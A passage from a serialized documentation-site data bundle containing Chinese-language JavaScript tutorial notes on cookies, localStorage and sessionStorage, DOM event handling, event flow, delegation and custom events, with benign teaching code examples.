清除\n\nlocalStorage.setItem("name","张三")  //设置数据\nlocalStorage.getItem("name");       //访问数据\nlocalStorage.removeItem("name");    //移除本地存储\nlocalStorage.clear()；              //清空本地存储\n\n\n\n# sessionStroage\n\n> 短期存储，页面关闭后存储消失，其他与长期存储一样\n\n针对一个 session 的数据存储，任何一个页面存储的信息在窗口中同一域下的页面都可以访问它存储的数据。每个窗口的值都是独立的，它的数据会因窗口的关闭而丢失，不同窗口间的sessionStorage是不可以共享的。\n\n常用于：\n\n * 具有时效性的网站信息，一段时候后打开浏览器数据消失\n * 登录信息保存\n * 搜索记录\n * 同一网站不同网页之间的数据可存储到本地存储共同使用\n\n方法                                 描述\nlocalStorage.length                获得storage中的个数\nlocalStorage .key(n)               获得storage中第n个键值对的键\nlocalStorage.key = value           添加\nlocalStorage.setItem(key, value)   添加\nlocalStorage.getItem(key)          获取\nlocalStorage.removeItem(key)       移除\nlocalStorage.clear()               清除\n\n\n# 三种存储方式的区别总结\n\n# 相同点\n\n都保存在浏览器端，同源的\n\n# 不同点\n\n 1. 传递方式不同\n    * cookie数据始终在同源的http请求中携带（即使不需要），即cookie在浏览器和服务器间来回传递。\n    * sessionStorage和localStorage不会自动把数据发给服务器，仅在本地保存。\n 2. 数据大小不同\n    * cookie数据不能超过4k\n    * sessionStorage和localStorage 虽然也有存储大小的限制，但比cookie大得多，可以达到5M或更大。\n 3. 数据有效期不同\n    * cookie只在设置的cookie过期时间之前一直有效，即使窗口或浏览器关闭。\n    * sessionStorage：仅在当前浏览器窗口关闭前有效。\n    * localStorage：始终有效，窗口或浏览器关闭也一直保存，因此用作持久数据；\n\n\n# 课堂练习\n\n 1. toDoList练习',normalizedContent:'# 本地存储\n\n> javascript在客户端的存储主要分为三种cookie、localstorage和sessionstorage\n\nchrome和safari均有自己的本地存储查看和管理工具，chrome中位于开发人员工具中的application选项中。localstorage在chrome查看如下，利用这个工具可以修改或者删除相应项。\n\n\n# cookie\n\n> cookie 是由 web 服务器保存在用户浏览器（客户端）上的小文本文件，它可以包含有关用户的信息。无论何时用户链接到服务器，web 站点都可以访问 cookie 信息。每个cookie不能超过 4kb，每个 web 站点能设置的 cookie 总数不能超过 20 个\n\n\n# 特点和应用\n\n类别     描述\n存储方式   键值对\n大小     4kb,以20个为上限\n访问     根据域名存储，不同域名的cookie无法访问\n清理机制   ie和opera 会清理近期最少使用的cookie，firefox会随机清理cookie。\n缺陷     同域内http请求都会带cookie，浪费带宽\n应用     购物车，登录状态\n\n\n# 操作cookie\n\n> 注意：cookie使用时需要服务器环境\n\n键值对的方式设置：\n\ndocument.cookie = "键=值"\ndocument.cookie = name + \'=\' + value;    //设置cookie\n\n\n// 设置cookie的有效时间\nvar d= new date();\nd.sethours(d.gethours() + (24 * 30)); //保存一个月\ndocument.cookie = "visited=yes; expires=" + d.toutcstring();\n\n\n// 读取cookie\ndocument.cookie.indexof("key")      //返回值 -1表示不存在此cookie\n\n\n//删除cookie     原理：通过设置cookie的有效时间来删除cookie\nvar exp = new date();\nexp.settime(exp.gettime() - 1);\ndocument.cookie= name + "="+cval+";expires="+exp.toutcstring();\n\n\n\n# localstorage\n\n> h5客户端存储是web存储的一种更为强大的版本，可提供更多的安全性、速度和易用性。在 web 中可以存储数量巨大的数据。具体的数量则取决于 web 浏览器，但通常都在 5mb 到10mb 之间，这对于一个 html应用程序而言已经足够大。另一个好处是此数据并不会在每次出现服务器请求时都被加载。\n\nlocalstorage 没有时间限制的数据存储，也就是说，localstorage是永远不会过期的，除非主动删除数据。数据可跨越多个窗口，无视当前会话，在同一个域中被共同访问、使用。\n\n\n# 特点和应用\n\n类别     描述\n兼容性    ie8+\n存储内容   只要是能序列化成字符串的内容都可以存储，利用json.stringify()；\n存储方式   键值对\n访问权限   根据域名存储，不同域名的本地存储无法访问\n存储大小   5m\n主要应用   常用于ajax请求缓存,需要长期保存的数据\n缺陷     不能跨域共享，所以不要用以存储业务关键信息，更加不要存储安全信息\n       （cookie可以通过window.name解决，但是localstorage不能）\n\n\n# 判断浏览器是否支持localstorage\n\nif (window.localstorage) {\n    console.log(\'浏览器支持\');\n} else {\n    console.log(\'浏览器不支持\');\n}\n\n\n\n# 操作localstorage\n\n方法                                 描述\nlocalstorage.length                获得storage中的个数\nlocalstorage .key(n)               获得storage中第n个键值对的键\nlocalstorage.key = value           添加\nlocalstorage.setitem(key, value)   添加\nlocalstorage.getitem(key)          获取\nlocalstorage.removeitem(key)       移除\nlocalstorage.clear()               清除\n\nlocalstorage.setitem("name","张三")  //设置数据\nlocalstorage.getitem("name");       //访问数据\nlocalstorage.removeitem("name");    //移除本地存储\nlocalstorage.clear()；              //清空本地存储\n\n\n\n# sessionstroage\n\n> 短期存储，页面关闭后存储消失，其他与长期存储一样\n\n针对一个 session 的数据存储，任何一个页面存储的信息在窗口中同一域下的页面都可以访问它存储的数据。每个窗口的值都是独立的，它的数据会因窗口的关闭而丢失，不同窗口间的sessionstorage是不可以共享的。\n\n常用于：\n\n * 具有时效性的网站信息，一段时候后打开浏览器数据消失\n * 登录信息保存\n * 搜索记录\n * 同一网站不同网页之间的数据可存储到本地存储共同使用\n\n方法                                 描述\nlocalstorage.length                获得storage中的个数\nlocalstorage .key(n)               获得storage中第n个键值对的键\nlocalstorage.key = value           添加\nlocalstorage.setitem(key, value)   添加\nlocalstorage.getitem(key)          获取\nlocalstorage.removeitem(key)       移除\nlocalstorage.clear()               清除\n\n\n# 三种存储方式的区别总结\n\n# 相同点\n\n都保存在浏览器端，同源的\n\n# 不同点\n\n 1. 传递方式不同\n    * cookie数据始终在同源的http请求中携带（即使不需要），即cookie在浏览器和服务器间来回传递。\n    * sessionstorage和localstorage不会自动把数据发给服务器，仅在本地保存。\n 2. 数据大小不同\n    * cookie数据不能超过4k\n    * sessionstorage和localstorage 虽然也有存储大小的限制，但比cookie大得多，可以达到5m或更大。\n 3. 数据有效期不同\n    * cookie只在设置的cookie过期时间之前一直有效，即使窗口或浏览器关闭。\n    * sessionstorage：仅在当前浏览器窗口关闭前有效。\n    * localstorage：始终有效，窗口或浏览器关闭也一直保存，因此用作持久数据；\n\n\n# 课堂练习\n\n 1. todolist练习',charsets:{cjk:!0}},{title:"事件高级",frontmatter:{},regularPath:"/Javascript/JavaScriptDOM%E6%93%8D%E4%BD%9C/%E4%BA%8B%E4%BB%B6%E9%AB%98%E7%BA%A7.html",relativePath:"Javascript/JavaScriptDOM操作/事件高级.md",key:"v-436e11b6",path:"/Javascript/JavaScriptDOM%E6%93%8D%E4%BD%9C/%E4%BA%8B%E4%BB%B6%E9%AB%98%E7%BA%A7.html",headers:[{level:2,title:"绑定事件的方式",slug:"绑定事件的方式",normalizedTitle:"绑定事件的方式",charIndex:11},{level:3,title:"标签绑定事件",slug:"标签绑定事件",normalizedTitle:"标签绑定事件",charIndex:23},{level:3,title:"Document对象来绑定事件",slug:"document对象来绑定事件",normalizedTitle:"document对象来绑定事件",charIndex:149},{level:3,title:"事件监听",slug:"事件监听",normalizedTitle:"事件监听",charIndex:544},{level:2,title:"事件对象",slug:"事件对象",normalizedTitle:"事件对象",charIndex:1759},{level:3,title:"获取事件对象",slug:"获取事件对象",normalizedTitle:"获取事件对象",charIndex:1844},{level:3,title:"事件对象常用的方法和属性",slug:"事件对象常用的方法和属性",normalizedTitle:"事件对象常用的方法和属性",charIndex:2515},{level:2,title:"事件流",slug:"事件流",normalizedTitle:"事件流",charIndex:874},{level:3,title:"两种事件流模型",slug:"两种事件流模型",normalizedTitle:"两种事件流模型",charIndex:3330},{level:3,title:"DOM事件流",slug:"dom事件流",normalizedTitle:"dom事件流",charIndex:3309},{level:3,title:"事件委派",slug:"事件委派",normalizedTitle:"事件委派",charIndex:3960},{level:2,title:"自定义事件(观察者模式)",slug:"自定义事件-观察者模式",normalizedTitle:"自定义事件(观察者模式)",charIndex:4412},{level:3,title:"事件创建",slug:"事件创建",normalizedTitle:"事件创建",charIndex:4466},{level:3,title:"自定义事件的监听",slug:"自定义事件的监听",normalizedTitle:"自定义事件的监听",charIndex:4712},{level:3,title:"自定义事件的触发",slug:"自定义事件的触发",normalizedTitle:"自定义事件的触发",charIndex:5023},{level:3,title:"简单的例子",slug:"简单的例子",normalizedTitle:"简单的例子",charIndex:5241},{level:2,title:"DOM事件流的简单例子",slug:"dom事件流的简单例子",normalizedTitle:"dom事件流的简单例子",charIndex:5564}],headersStr:"绑定事件的方式 标签绑定事件 Document对象来绑定事件 事件监听 事件对象 获取事件对象 事件对象常用的方法和属性 事件流 两种事件流模型 DOM事件流 事件委派 自定义事件(观察者模式) 事件创建 自定义事件的监听 自定义事件的触发 简单的例子 DOM事件流的简单例子",content:'# 事件高级\n\n\n# 绑定事件的方式\n\n\n# 标签绑定事件\n\n<button onclick="click_fn()">click</button>\n<script>\n  function click_fn(){\n    console.log(this);\n  }\n<\/script>\n\n\n\n# Document对象来绑定事件\n\n> 注意：重复监听某一事件，后者会覆盖前者，而不会两者先后触发\n\n<button>click</button>\n<script>\n    var button1 = document.querySelector(\'button\')\n    button1.onclick=function(){\n        console.log("第一个点击事件的方法");\n    }\n    var button2 = document.querySelector(\'button\')\n    button2.onclick=function(){\n        console.log("第二个点击事件的方法");\n    }      //第二个点击事件的方法会覆盖第一个方法,所以点击只会触发第二次的点击事件方法     \n<\/script>\n\n\n\n# 事件监听\n\n> 为一个事件添加多个事件处理程序，解决了上面两种方法不能添加多个方法 更精细的控制事件监听器的触发阶段\n\n# 绑定事件\n\n语法：\n\nelement.addEventListener(event,callback,bool);  \n\n\n参数         类型         描述\nevent      string     表示事件类型的字符串 如："click" "mouseover" 事件名称不添加on前缀\ncallback   function   表示事件处理程序，函数中的this 指向添加监听的对象\nbool       boolean    可选，true表示在捕获阶段调用事件处理程序；false表示在冒泡阶段调用。后面会有事件流的详细解释\n\n标签.addEventListener("事件名称",function(){},false);    //兼容到IE9及其以上\n\n标签.attachEvent("事件名称",function(){})    //  ie8及以下\n\n\n# 移除事件绑定\n\n语法：\n\nelement.removeEventListener(event,callback,bool);  \n\n\n<button id="myBtn"></button>\n<script type="text/javascript">\n  var btn=document.getElementById(\'myBtn\');\n  function handle(){\n    console.log(this);\n  }\n  //兼容到IE9及其以上\n  btn.addEventListener(\'click\',handle,false);      //添加事件处理程序\n  btn.removeEventListener(\'click\',handle,false);    //移除事件处理程序\n\n  //  ie8及以下\n  btn.attachEvent(\'onclick\',handle);       // 添加\n  btn.detachEvent(\'onclick\',handle);       // 移除\n<\/script>\n\n\n> 注意：当需要移除事件监听，不能使用匿名函数。必须能够获取函数引用。\n\n# 事件监听的兼容写法\n\nfunction addEvent(obj,type,handle){\n  try{\n   obj.addEventListener(type,handle,false);\n  }catch(e){\n   try{\n    obj.attachEvent(\'on\'+type,handle);\n   }\n   catch(e){\n    obj[\'on\' + type]=handle;     //早期浏览器\n   }\n  }\n}\n\n\n\n# 事件对象\n\n> 在触发DOM上的某个事件时，会产生一个事件对象event，这个对象中包含着所有与事件有关的信息。所有浏览器都支持event对象，但支持方式不同。\n\n\n# 获取事件对象\n\nevent对象是事件程序的第一个参数(IE8及以下不支持)\n\n<div id="box" style="height:30px;width:200px;background:pink;"></div>\n<script>\nvar oBox = document.getElementById(\'box\');\noBox.onclick = function(event){\n    box.innerHTML = event;\n}\n<\/script>\n\n\n直接使用event变量(火狐浏览器不支持，输出event未定义)\n\n<div id="box" style="height:30px;width:200px;background:pink;"></div>\n<script>\nvar oBox = document.getElementById(\'box\');\noBox.onclick = function(){\n    box.innerHTML = event;\n}\n<\/script>\n\n\n兼容性写法\n\n<div id="box" style="height:30px;width:200px;background:pink;"></div>\n<script>\nvar oBox = document.getElementById(\'box\');\noBox.onclick = function(e){\n  e = e || event;\n  box.innerHTML = e;\n}\n<\/script>\n\n\n\n# 事件对象常用的方法和属性\n\n# 鼠标事件相关\n\n属性        含义\nclientX   当鼠标事件发生的时候，鼠标相对于浏览器X轴的位置\nclientY   当鼠标事件发生的时候，鼠标相对于浏览器Y轴的位置\noffsetX   当鼠标事件发生的时候，鼠标相对于事件源X轴的位置\noffsetY   当鼠标事件发生的时候，鼠标相对于事件源Y轴的位置\npageX     当鼠标事件发生的时候，鼠标相对于浏览器X轴的位置，包含页面横向滚动距离\npageY     当鼠标事件发生的时候，鼠标相对于浏览器X轴的位置，包含页面纵向滚动距离\n\n# 滚轮事件相关\n\n属性           含义\nwheelDelta   滚动量\n\ne.wheelDelta\n上： 120  240\n下：-120 -240  \n\n\n# 键盘事件相关\n\n属性         含义\nkey        获取当前所按键的名称\nkeyCode    获取当前所按键的键盘码\nctrlKey    判断当前ctrl键是否按下的状态\nshiftKey   判断当前shift键是否按下的状态\naltKey     判断当前alt键是否按下的状态\n\n# 其他属性和方法\n\n属性                  含义\npreventDefault()    阻止浏览器默认行为\nstopPropagation()   阻止事件流的传播\ncurrentTarget       指向被绑定事件的元素\ntarget              指向事件触发的对象，当事件是处在冒泡或者捕获阶段调用的时候，指向最先触发事件的事件源\ntype                返回当前所触发事件的事件名称\n\n\n# 事件流\n\n> 事件发生时会在元素节点与根节点之间按照特定的顺序传播，路径所经过的所有节点都会收到该事件，这个传播过程即DOM事件流。 事件传播的顺序对应浏览器的两种事件流模型：捕获型事件流和冒泡型事件流。\n\n\n# 两种事件流模型\n\n * 冒泡型事件流：事件的传播是从最特定的事件目标到最不特定的事件目标。\n * 捕获型事件流：事件的传播是从最不特定的事件目标到最特定的事件目标。\n   \n\n\n\n> IE9、Firefox、Chrome、Opera、和Safari都支持事件捕获。尽管DOM标准要求事件应该从document对象开始传播，但这些浏览器都是从window对象开始捕获事件的。\n\n\n# DOM事件流\n\n> DOM标准采用捕获+冒泡。两种事件流都会触发DOM的所有对象，从document对象开始，也在document对象结束。\n\n# DOM事件流的三个阶段\n\nDOM标准规定事件流包括三个阶段：事件捕获阶段、处于目标阶段和事件冒泡阶段。\neventPhase属性返回一个整数值，表示事件目前所处的事件流阶段:0表示事件没有发生，1表示捕获阶段，2表示目标阶段，3表示冒泡阶段\n\n 1. 事件捕获阶段：实际目标（<div>）在捕获阶段不会接收事件。也就是在捕获阶段，事件从document到<html>再到<body>就停止了。\n 2. 处于目标阶段：事件在<div>上发生并处理。但是事件处理会被看成是冒泡阶段的一部分。\n 3. 冒泡阶段：事件又传播回文档。\n 4. 所有的事件都要经过捕获阶段和处于目标阶段，但是有些事件会跳过冒泡阶段：如，获得输入焦点的focus事件和失去输入焦点的blur事件。\n\n\n# 事件委派\n\n> 事件委派的原理用到的就是事件冒泡和目标元素，把事件处理器添加到父元素，等待子元素事件冒泡，并且父元素能够通过target（IE为srcElement）判断是哪个子元素，从而做相应处理。\n\n# 用法\n\n 1. 子元素的事件加到父元素上\n 2. 触发事件时判断 触发该事件的元素是什么（e.target）\n    * 判断内容 innerHTML innerText\n    * 标签名 nodeName (判断的时候，标签名需要大写)\n    * 属性 e.target.hasAttribute("属性名"); 有则是true 无则是false\n    * 类名 ID e.target.classList.contains("类名")； 有则是true 无则是false\n 3. 在判断成功中写对应的处理函数\n\n# 应用场合\n\n 1. 需要给大量元素添加同一事件处理程序的时候，提高代码运行的效率\n 2. 在页面加载完成后新创建的元素， 比如通过ajax异步加载生成dom对象\n\n\n# 自定义事件(观察者模式)\n\n> 自定义事件，顾名思义，就是自己定义事件类型，自己定义事件处理函数.\n\n\n# 事件创建\n\nJS中，最简单的创建事件方法，是使用Event构造器：\n\nvar myEvent = new Event(\'event_name\');\n\n\n为了能够传递数据，使用 CustomEvent 构造器：\n\nvar myEvent = new CustomEvent(\'event_name\', { detail:{\n    // 将需要传递的数据写在detail中，以便在EventListener中获取\n    // 数据将会在event.detail中得到\n}, });\n\n\n\n# 自定义事件的监听\n\nJS的EventListener是根据事件的名称来进行监听的，我们进行自定义事件监听的时候，需要创建相应的监听器\n\n//假设listener注册在window对象上\nwindow.addEventListener(\'event_name\', function(event){\n  // 如果是CustomEvent，传入的数据在event.detail中\n  console.log(\'得到数据为：\', event.detail);\n  // ...后续相关操作\n});\n\n\n进行到这一步，window对象上就有了event_name这个事件的监听器，当触发这个事件时，相应的回调函数就会触发\n\n\n# 自定义事件的触发\n\n> 普通的事件触发我们都有相对应的操作区，比如click，鼠标单击来触发，自定义事件需要我们显式的去触发它，使用dispatchEvent去触发(IE8低版本兼容，使用fireEvent);\n\nif(window.dispatchEvent) {  \n    window.dispatchEvent(myEvent);\n} else {\n    window.fireEvent(myEvent);\n}\n\n\n\n# 简单的例子\n\nvar myEvent = new CustomEvent(\'event_name\', {\n  detail: { title: \'This is title!\'},\n});\nwindow.addEventListener(\'event_name\', function(event){\n  console.log(\'得到标题为：\', event.detail.title);\n});\n// 随后在对应的元素上触发该事件\nif(window.dispatchEvent) {\n  window.dispatchEvent(myEvent);\n} else {\n   window.fireEvent(myEvent);\n}\n\n\n\n# DOM事件流的简单例子\n\n<!DOCTYPE html>\n<html>\n<head lang="en">\n    <meta charset="UTF-8">\n    <title></title>\n</head>\n<style>\n    #outer{\n        position: absolute;\n        width: 400px;\n        height: 400px;\n        top:0;\n        left: 0;\n        bottom:0;\n        right: 0;\n        margin: auto;\n        background-color: deeppink;\n    }\n    #middle{\n        position: absolute;\n        width: 300px;\n        height:300px;\n        top:50%;\n        left: 50%;\n        margin-left: -150px;\n        margin-top: -150px;\n        background-color: deepskyblue;\n    }\n    #inner{\n        position: absolute;\n        width: 100px;\n        height:100px;\n        top:50%;\n        left:50%;\n        margin-left: -50px;\n        margin-top: -50px;;\n        background-color: darkgreen;\n        text-align: center;\n        line-height: 100px;\n        color:white;\n    }\n    #outer,#middle,#inner{\n        border-radius:100%;\n    }\n</style>\n<body>\n<div id="outer">\n    <div id="middle">\n        <div id="inner">\n            click me!\n        </div>\n    </div>\n</div>\n<script>\n    var innerCircle= document.getElementById("inner");\n    innerCircle.addEventListener("click", function () {\n        alert("innerCircle的click事件在捕获阶段被触发");\n    },true);\n    innerCircle.addEventListener("click", function () {\n        alert("innerCircle的click事件在冒泡阶段被触发");\n    },false);\n    var middleCircle= document.getElementById("middle");\n    middleCircle.addEventListener("click", function () {\n        alert("middleCircle的click事件在捕获阶段被触发");\n    },true);\n    middleCircle.addEventListener("click", function () {\n        alert("middleCircle的click事件在冒泡阶段被触发");\n    },false);\n    var outerCircle= document.getElementById("outer");\n    outerCircle.addEventListener("click", function () {\n        alert("outerCircle的click事件在捕获阶段被触发");\n    },true);\n    outerCircle.addEventListener("click", function () {\n        alert("outerCircle的click事件在冒泡阶段被触发");\n    },false);\n<\/script>\n</body>\n</html>\n',normalizedContent:'# 事件高级\n\n\n# 绑定事件的方式\n\n\n# 标签绑定事件\n\n<button onclick="click_fn()">click</button>\n<script>\n  function click_fn(){\n    console.log(this);\n  }\n<\/script>\n\n\n\n# document对象来绑定事件\n\n> 注意：重复监听某一事件，后者会覆盖前者，而不会两者先后触发\n\n<button>click</button>\n<script>\n    var button1 = document.queryselector(\'button\')\n    button1.onclick=function(){\n        console.log("第一个点击事件的方法");\n    }\n    var button2 = document.queryselector(\'button\')\n    button2.onclick=function(){\n        console.log("第二个点击事件的方法");\n    }      //第二个点击事件的方法会覆盖第一个方法,所以点击只会触发第二次的点击事件方法     \n<\/script>\n\n\n\n# 事件监听\n\n> 为一个事件添加多个事件处理程序，解决了上面两种方法不能添加多个方法 更精细的控制事件监听器的触发阶段\n\n# 绑定事件\n\n语法：\n\nelement.addeventlistener(event,callback,bool);  \n\n\n参数         类型         描述\nevent      string     表示事件类型的字符串 如："click" "mouseover" 事件名称不添加on前缀\ncallback   function   表示事件处理程序，函数中的this 指向添加监听的对象\nbool       boolean    可选，true表示在捕获阶段调用事件处理程序；false表示在冒泡阶段调用。后面会有事件流的详细解释\n\n标签.addeventlistener("事件名称",function(){},false);    //兼容到ie9及其以上\n\n标签.attachevent("事件名称",function(){})    //  ie8及以下\n\n\n# 移除事件绑定\n\n语法：\n\nelement.removeeventlistener(event,callback,bool);  \n\n\n<button id="mybtn"></button>\n<script type="text/javascript">\n  var btn=document.getelementbyid(\'mybtn\');\n  function handle(){\n    console.log(this);\n  }\n  //兼容到ie9及其以上\n  btn.addeventlistener(\'click\',handle,false);      //添加事件处理程序\n  btn.removeeventlistener(\'click\',handle,false);    //移除事件处理程序\n\n  //  ie8及以下\n  btn.attachevent(\'onclick\',handle);       // 添加\n  btn.detachevent(\'onclick\',handle);       // 移除\n<\/script>\n\n\n> 注意：当需要移除事件监听，不能使用匿名函数。必须能够获取函数引用。\n\n# 事件监听的兼容写法\n\nfunction addevent(obj,type,handle){\n  try{\n   obj.addeventlistener(type,handle,false);\n  }catch(e){\n   try{\n    obj.attachevent(\'on\'+type,handle);\n   }\n   catch(e){\n    obj[\'on\' + type]=handle;     //早期浏览器\n   }\n  }\n}\n\n\n\n# 事件对象\n\n> 在触发dom上的某个事件时，会产生一个事件对象event，这个对象中包含着所有与事件有关的信息。所有浏览器都支持event对象，但支持方式不同。\n\n\n# 获取事件对象\n\nevent对象是事件程序的第一个参数(ie8及以下不支持)\n\n<div id="box" style="height:30px;width:200px;background:pink;"></div>\n<script>\nvar obox = document.getelementbyid(\'box\');\nobox.onclick = function(event){\n    box.innerhtml = event;\n}\n<\/script>\n\n\n直接使用event变量(火狐浏览器不支持，输出event未定义)\n\n<div id="box" style="height:30px;width:200px;background:pink;"></div>\n<script>\nvar obox = document.getelementbyid(\'box\');\nobox.onclick = function(){\n    box.innerhtml = event;\n}\n<\/script>\n\n\n兼容性写法\n\n<div id="box" style="height:30px;width:200px;background:pink;"></div>\n<script>\nvar obox = document.getelementbyid(\'box\');\nobox.onclick = function(e){\n  e = e || event;\n  box.innerhtml = e;\n}\n<\/script>\n\n\n\n# 事件对象常用的方法和属性\n\n# 鼠标事件相关\n\n属性        含义\nclientx   当鼠标事件发生的时候，鼠标相对于浏览器x轴的位置\nclienty   当鼠标事件发生的时候，鼠标相对于浏览器y轴的位置\noffsetx   当鼠标事件发生的时候，鼠标相对于事件源x轴的位置\noffsety   当鼠标事件发生的时候，鼠标相对于事件源y轴的位置\npagex     当鼠标事件发生的时候，鼠标相对于浏览器x轴的位置，包含页面横向滚动距离\npagey     当鼠标事件发生的时候，鼠标相对于浏览器x轴的位置，包含页面纵向滚动距离\n\n# 滚轮事件相关\n\n属性           含义\nwheeldelta   滚动量\n\ne.wheeldelta\n上： 120  240\n下：-120 -240  \n\n\n# 键盘事件相关\n\n属性         含义\nkey        获取当前所按键的名称\nkeycode    获取当前所按键的键盘码\nctrlkey    判断当前ctrl键是否按下的状态\nshiftkey   判断当前shift键是否按下的状态\naltkey     判断当前alt键是否按下的状态\n\n# 其他属性和方法\n\n属性                  含义\npreventdefault()    阻止浏览器默认行为\nstoppropagation()   阻止事件流的传播\ncurrenttarget       指向被绑定事件的元素\ntarget              指向事件触发的对象，当事件是处在冒泡或者捕获阶段调用的时候，指向最先触发事件的事件源\ntype                返回当前所触发事件的事件名称\n\n\n# 事件流\n\n> 事件发生时会在元素节点与根节点之间按照特定的顺序传播，路径所经过的所有节点都会收到该事件，这个传播过程即dom事件流。 事件传播的顺序对应浏览器的两种事件流模型：捕获型事件流和冒泡型事件流。\n\n\n# 两种事件流模型\n\n * 冒泡型事件流：事件的传播是从最特定的事件目标到最不特定的事件目标。\n * 捕获型事件流：事件的传播是从最不特定的事件目标到最特定的事件目标。\n   \n\n\n\n> ie9、firefox、chrome、opera、和safari都支持事件捕获。尽管dom标准要求事件应该从document对象开始传播，但这些浏览器都是从window对象开始捕获事件的。\n\n\n# dom事件流\n\n> dom标准采用捕获+冒泡。两种事件流都会触发dom的所有对象，从document对象开始，也在document对象结束。\n\n# dom事件流的三个阶段\n\ndom标准规定事件流包括三个阶段：事件捕获阶段、处于目标阶段和事件冒泡阶段。\neventphase属性返回一个整数值，表示事件目前所处的事件流阶段:0表示事件没有发生，1表示捕获阶段，2表示目标阶段，3表示冒泡阶段\n\n 1. 事件捕获阶段：实际目标（<div>）在捕获阶段不会接收事件。也就是在捕获阶段，事件从document到<html>再到<body>就停止了。\n 2. 处于目标阶段：事件在<div>上发生并处理。但是事件处理会被看成是冒泡阶段的一部分。\n 3. 冒泡阶段：事件又传播回文档。\n 4. 所有的事件都要经过捕获阶段和处于目标阶段，但是有些事件会跳过冒泡阶段：如，获得输入焦点的focus事件和失去输入焦点的blur事件。\n\n\n# 事件委派\n\n> 事件委派的原理用到的就是事件冒泡和目标元素，把事件处理器添加到父元素，等待子元素事件冒泡，并且父元素能够通过target（ie为srcelement）判断是哪个子元素，从而做相应处理。\n\n# 用法\n\n 1. 子元素的事件加到父元素上\n 2. 触发事件时判断 触发该事件的元素是什么（e.target）\n    * 判断内容 innerhtml innertext\n    * 标签名 nodename (判断的时候，标签名需要大写)\n    * 属性 e.target.hasattribute("属性名"); 有则是true 无则是false\n    * 类名 id e.target.classlist.contains("类名")； 有则是true 无则是false\n 3. 在判断成功中写对应的处理函数\n\n# 应用场合\n\n 1. 需要给大量元素添加同一事件处理程序的时候，提高代码运行的效率\n 2. 在页面加载完成后新创建的元素， 比如通过ajax异步加载生成dom对象\n\n\n# 自定义事件(观察者模式)\n\n> 自定义事件，顾名思义，就是自己定义事件类型，自己定义事件处理函数.\n\n\n# 事件创建\n\njs中，最简单的创建事件方法，是使用event构造器：\n\nvar myevent = new event(\'event_name\');\n\n\n为了能够传递数据，使用 customevent 构造器：\n\nvar myevent = new customevent(\'event_name\', { detail:{\n    // 将需要传递的数据写在detail中，以便在eventlistener中获取\n    // 数据将会在event.detail中得到\n}, });\n\n\n\n# 自定义事件的监听\n\njs的eventlistener是根据事件的名称来进行监听的，我们进行自定义事件监听的时候，需要创建相应的监听器\n\n//假设listener注册在window对象上\nwindow.addeventlistener(\'event_name\', function(event){\n  // 如果是customevent，传入的数据在event.detail中\n  console.log(\'得到数据为：\', event.detail);\n  // ...后续相关操作\n});\n\n\n进行到这一步，window对象上就有了event_name这个事件的监听器，当触发这个事件时，相应的回调函数就会触发\n\n\n# 自定义事件的触发\n\n> 普通的事件触发我们都有相对应的操作区，比如click，鼠标单击来触发，自定义事件需要我们显式的去触发它，使用dispatchevent去触发(ie8低版本兼容，使用fireevent);\n\nif(window.dispatchevent) {  \n    window.dispatchevent(myevent);\n} else {\n    window.fireevent(myevent);\n}\n\n\n\n# 简单的例子\n\nvar myevent = new customevent(\'event_name\', {\n  detail: { title: \'this is title!\'},\n});\nwindow.addeventlistener(\'event_name\', function(event){\n  console.log(\'得到标题为：\', event.detail.title);\n});\n// 随后在对应的元素上触发该事件\nif(window.dispatchevent) {\n  window.dispatchevent(myevent);\n} else {\n   window.fireevent(myevent);\n}\n\n\n\n# dom事件流的简单例子\n\n<!doctype html>\n<html>\n<head lang="en">\n    <meta charset="utf-8">\n    <title></title>\n</head>\n<style>\n    #outer{\n        position: absolute;\n        width: 400px;\n        height: 400px;\n        top:0;\n        left: 0;\n        bottom:0;\n        right: 0;\n        margin: auto;\n        background-color: deeppink;\n    }\n    #middle{\n        position: absolute;\n        width: 300px;\n        height:300px;\n        top:50%;\n        left: 50%;\n        margin-left: -150px;\n        margin-top: -150px;\n        background-color: deepskyblue;\n    }\n    #inner{\n        position: absolute;\n        width: 100px;\n        height:100px;\n        top:50%;\n        left:50%;\n        margin-left: -50px;\n        margin-top: -50px;;\n        background-color: darkgreen;\n        text-align: center;\n        line-height: 100px;\n        color:white;\n    }\n    #outer,#middle,#inner{\n        border-radius:100%;\n    }\n</style>\n<body>\n<div id="outer">\n    <div id="middle">\n        <div id="inner">\n            click me!\n        </div>\n    </div>\n</div>\n<script>\n    var innercircle= document.getelementbyid("inner");\n    innercircle.addeventlistener("click", function () {\n        alert("innercircle的click事件在捕获阶段被触发");\n    },true);\n    innercircle.addeventlistener("click", function () {\n        alert("innercircle的click事件在冒泡阶段被触发");\n    },false);\n    var middlecircle= document.getelementbyid("middle");\n    middlecircle.addeventlistener("click", function () {\n        alert("middlecircle的click事件在捕获阶段被触发");\n    },true);\n    middlecircle.addeventlistener("click", function () {\n        alert("middlecircle的click事件在冒泡阶段被触发");\n    },false);\n    var outercircle= document.getelementbyid("outer");\n    outercircle.addeventlistener("click", function () {\n        alert("outercircle的click事件在捕获阶段被触发");\n    },true);\n    outercircle.addeventlistener("click", function () {\n        alert("outercircle的click事件在冒泡阶段被触发");\n    },false);\n<\/script>\n</body>\n</html>\n',charsets:{cjk:!0}},{title:"BOM",frontmatter:{},regularPath:"/Javascript/JavaScriptBOM%E6%93%8D%E4%BD%9C/window%E5%AF%B9%E8%B1%A1.html",relativePath:"Javascript/JavaScriptBOM操作/window对象.md",key:"v-70c85bc1",path:"/Javascript/JavaScriptBOM%E6%93%8D%E4%BD%9C/window%E5%AF%B9%E8%B1%A1.html",headers:[{level:2,title:"window对象",slug:"window对象",normalizedTitle:"window对象",charIndex:208},{level:3,title:"window对象属性",slug:"window对象属性",normalizedTitle:"window对象属性",charIndex:221},{level:3,title:"window对象方法",slug:"window对象方法",normalizedTitle:"window对象方法",charIndex:897},{level:3,title:"特殊",slug:"特殊",normalizedTitle:"特殊",charIndex:2616}],headersStr:"window对象 window对象属性 window对象方法 特殊",content:"# BOM\n\n> BOM(Browser Object Model) 浏览器对象模型\n\n> ECMAScript提供核心语言功能，例如变量分支循环等功能 而BOM提供与浏览器交互的方法和接口，使用BOM可以访问和操作浏览器窗口，可以控制浏览器显示的页面以外的部分\n\nBOM由一系列相关的对象构成，并且每个对象都提供了很多方法与属性，由于BOM主要用于管理窗口与窗口之间的通讯，因此其核心对象是window；\n\n\n# window对象\n\n\n# window对象属性\n\n属性              描述                 可读写性   兼容性\ninnerWidth      浏览器窗口宽度            只读     >ie8\ninnerHeight     浏览器窗口高度            只读     >ie8\nscreen.width    